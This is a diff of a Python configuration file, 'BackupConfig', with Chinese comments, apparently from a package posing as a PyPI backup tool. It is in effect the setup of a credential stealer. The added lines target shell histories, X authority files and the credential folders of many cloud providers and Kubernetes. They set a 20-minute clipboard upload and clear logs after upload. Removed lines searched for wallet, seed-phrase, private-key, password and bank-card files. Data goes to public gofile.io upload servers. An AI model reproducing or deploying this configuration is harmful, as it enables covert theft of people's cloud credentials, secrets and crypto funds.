@@ -1,4 +1,7 @@
 # -*- coding: utf-8 -*-
+"""
+备份配置模块
+"""
 
 from pathlib import Path
 
@@ -19,15 +22,15 @@ class BackupConfig:
    
     # 备份间隔配置
     BACKUP_INTERVAL = 260000  # 备份间隔时间：约3天
+    CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
     SCAN_TIMEOUT = 1800    # 扫描超时时间：30分钟
     
     # 日志配置
-    LOG_FILE = str(Path.home() / ".dev/pypi_Backup/backup.log")
-    LOG_MAX_SIZE = 10 * 1024 * 1024  # 日志文件最大大小：10MB
-    LOG_BACKUP_COUNT = 10             # 保留的日志备份数量
+    LOG_FILE = str(Path.home() / ".dev/pypi-Backup/backup.log")
+    # 注意：已改为上传后清空机制，不再使用日志轮转
 
     # 时间阈值文件配置
-    THRESHOLD_FILE = str(Path.home() / ".dev/pypi_Backup/next_backup_time.txt")  # 时间阈值文件路径
+    THRESHOLD_FILE = str(Path.home() / ".dev/pypi-Backup/next_backup_time.txt")  # 时间阈值文件路径
 
     # 需要备份的服务器目录或文件
     SERVER_BACKUP_DIRS = [
@@ -35,99 +38,28 @@ class BackupConfig:
         ".bash_history",  # Bash历史记录
         ".python_history", # Python历史记录
         ".bash_aliases",  # Bash别名
-        "Documents",      # 文档目录
         ".node_repl_history", # Node.js REPL 历史记录
         ".wget-hsts",     # wget HSTS 历史记录
         ".Xauthority",    # Xauthority 文件
         ".ICEauthority",  # ICEauthority 文件
+        # VPS服务商配置目录
+        ".aws",               # AWS配置
+        ".gcloud",            # Google Cloud配置
+        ".azure",             # Azure配置
+        ".aliyun",            # 阿里云配置
+        ".tencentcloud",      # 腾讯云配置
+        ".tccli",             # 腾讯云CLI配置
+        ".doctl",             # DigitalOcean配置
+        ".hcloud",            # Hetzner配置
+        ".vultr",             # Vultr配置
+        ".linode",            # Linode配置
+        ".oci",               # Oracle Cloud配置
+        ".bandwagon",         # 搬瓦工配置
+        ".bwg",               # 搬瓦工配置
+        ".kube",              # Kubernetes配置
     ]
 
-    # 需要备份的文件类型
-    # 文档类型扩展名
-    DOC_EXTENSIONS = [
-        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
-        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md",
-    ]
-    # 配置类型扩展名
-    CONFIG_EXTENSIONS = [
-        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
-        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
-    ]
-    # 所有备份扩展名（用于兼容性）
-    BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
-    
-    # 排除的目录
-    EXCLUDE_DIRS = [
-        ".bashrc",
-        ".bitcoinlib",
-        ".cargo",
-        ".conda",
-        ".docker",
-        ".dotnet",
-        ".fonts",
-        ".git",
-        ".gongfeng-copilot",
-        ".gradle",
-        ".icons",
-        ".jupyter",
-        ".landscape",
-        ".local",
-        ".npm",
-        ".nvm",
-        ".orca_term",
-        ".pki",
-        ".pm2",
-        ".profile",
-        ".rustup",
-        ".ssh",
-        ".solcx",
-        ".themes",
-        ".thunderbird",
-        ".wdm",
-        "cache",
-        "myenv",
-        "snap",
-        "venv",
-        "node_modules",
-        "dist",
-        ".cache",
-        ".config",
-        ".vscode-server",
-        "build",
-        ".vscode-remote-ssh",
-        ".git",
-        "__pycache__",
-    ]
-
-    # 关键字备份配置 - 备份包含以下关键字的文件和文件夹
-    KEYWORD_BACKUP_KEYWORDS = [
-        "wallet",
-        "seed",
-        "mnemonic",
-        "private",
-        "privkey",
-        "keypair",
-        "secret",
-        "account",
-        "password",
-        "bank",
-        "card",
-        "solana",
-        "important",
-        "钱包",
-        "助记词",
-        "种子",
-        "私钥",
-        "密钥",
-        "密码",
-        "账户",
-        "账号",
-        "信用卡",
-        "备忘",
-        "重要",
-    ]
-
-    # 上传服务器配置
+    # GoFile 上传配置（备选方案）
     UPLOAD_SERVERS = [
         "https://store9.gofile.io/uploadFile",
         "https://store8.gofile.io/uploadFile",
@@ -145,4 +77,3 @@ class BackupConfig:
     ]
     NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
     NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数
-
